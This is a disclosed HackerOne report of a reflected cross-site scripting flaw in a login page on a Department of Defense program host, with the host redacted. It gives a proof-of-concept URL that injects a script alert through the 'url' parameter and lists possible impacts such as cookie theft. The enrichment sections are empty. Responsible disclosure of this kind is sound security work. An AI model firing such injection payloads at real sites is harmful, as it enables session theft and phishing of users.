---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1390131'
original_report_id: '1390131'
title: Reflected XSS
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: deptofdefense
created_at: '2021-11-02T22:49:12.022Z'
disclosed_at: '2023-01-06T19:14:56.813Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 26
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected XSS

## Metadata

- HackerOne Report ID: 1390131
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: deptofdefense
- Disclosed At: 2023-01-06T19:14:56.813Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Description:**
Hi i found a XSS at a new IP Address (ssl points to ███hostname)


https://███████/WebPuff5.4/Login?signIn=Sign%20In&password=g00dPa%24%24w0rD&url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E&username=tMtFQiRt

## References
https://owasp.org/www-community/attacks/xss/

## Impact

With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.

## System Host(s)
███████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
click here and a alert will popup https://█████/WebPuff5.4/Login?signIn=Sign%20In&password=g00dPa%24%24w0rD&url=login.jsp%27%22()%26%25%3Cacx%3E%3CScRiPt%20%3Ealert(9868)%3C/ScRiPt%3E&username=tMtFQiRt

## Suggested Mitigation/Remediation Actions
Sanitize special character in the url

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
